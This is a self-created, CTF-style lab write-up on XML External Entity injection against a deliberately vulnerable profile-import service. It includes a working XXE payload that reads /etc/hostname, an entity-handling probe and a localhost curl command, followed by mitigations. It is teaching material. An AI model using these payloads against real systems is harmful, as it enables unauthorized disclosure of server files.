# CTF-Style Practice Lab — XXE Local File Read

> **Practice content:** This is a self-created CTF-style lab scenario. It is **not** an official CTF challenge, a real-world finding, or a claim of a solved competition challenge.

## Challenge / Context

The practice application provides an XML-based profile import feature. The server parses user-controlled XML and returns the parsed profile fields.

The lab is designed to demonstrate how an XML parser that permits external entities can cross a trust boundary and read a local file.

**Objective:** Determine whether the XML parser resolves external entities and, if so, demonstrate controlled local file disclosure inside the isolated practice environment.

## Reconnaissance / Analysis

Start by inspecting the normal request generated by the profile import function.

```http
POST /profile/import HTTP/1.1
Content-Type: application/xml

<profile>
  <name>Tony</name>
  <role>student</role>
</profile>
```

The response contains the parsed values, which indicates that the application is processing XML on the server rather than treating the body as plain text.

The next step is to determine how the XML parser handles a document type declaration and external entities.

## Vulnerability / Technique

The vulnerable behavior is **XML External Entity (XXE) processing**.

An XML document can define an entity that references a local resource. If the server-side parser resolves external entities, a reference such as `file:///etc/hostname` can be expanded before the application processes the XML.

A controlled proof-of-concept for an isolated lab is:

```xml
<?xml version="1.0"?>
<!DOCTYPE profile [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<profile>
  <name>&xxe;</name>
  <role>student</role>
</profile>
```

This payload does not target an external system. It is intended only for the deliberately vulnerable local practice service.

## Solution Steps

### 1. Confirm XML parsing

Submit the normal XML profile and verify that the application returns the parsed fields.

### 2. Test entity handling

Submit a harmless internal entity first:

```xml
<?xml version="1.0"?>
<!DOCTYPE profile [
  <!ENTITY test "XXE_TEST">
]>
<profile>
  <name>&test;</name>
  <role>student</role>
</profile>
```

If the response contains `XXE_TEST`, the parser is processing entity declarations.

### 3. Test external entity resolution

In the isolated lab, replace the internal entity with a local file reference:

```xml
<!DOCTYPE profile [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
```

Reference the entity in a parsed field:

```xml
<profile>
  <name>&xxe;</name>
  <role>student</role>
</profile>
```

### 4. Analyze the response

If external entity resolution is enabled, the value returned for `name` contains the contents of the selected local file from the lab container.

The important observation is not the specific hostname or file content. The security issue is that **attacker-controlled XML caused the server to access a local resource**.

## Key Commands / Testing Notes

For a local lab, the request can be sent with `curl`:

```bash
curl -i http://127.0.0.1:8080/profile/import \
  -H 'Content-Type: application/xml' \
  --data-binary @xxe.xml
```

Create the test payload in `xxe.xml` and send it only to the local practice service.

Useful defensive checks include identifying the XML library and verifying whether external entity processing is disabled by default and by explicit parser configuration.

## Result

**Practice-lab result:** The deliberately vulnerable scenario demonstrates that enabling external entity resolution allows XML input to access a local resource outside the intended profile-data boundary.

This is a simulated outcome of the self-created lab and is **not** an actual CTF flag, ranking, CVE, or real-world vulnerability claim.

## Lessons Learned

- XML input should be treated as untrusted data.
- External entity resolution is unnecessary for most application-level XML parsing and should be disabled.
- Testing should cover both ordinary XML functionality and parser-specific security behavior.
- A successful XXE condition can affect confidentiality by exposing local resources.
- Parser configuration is part of the application's security boundary, not merely an implementation detail.

## Mitigation

For applications that must process XML:

1. Disable external entity resolution.
2. Disable DTD processing when it is not required.
3. Use a hardened XML parser configuration appropriate to the language and library.
4. Validate the expected XML structure before business-logic processing.
5. Apply least privilege to the application process so a parser compromise has limited filesystem access.
6. Add regression tests that verify malicious entity declarations are rejected or treated as inert data.
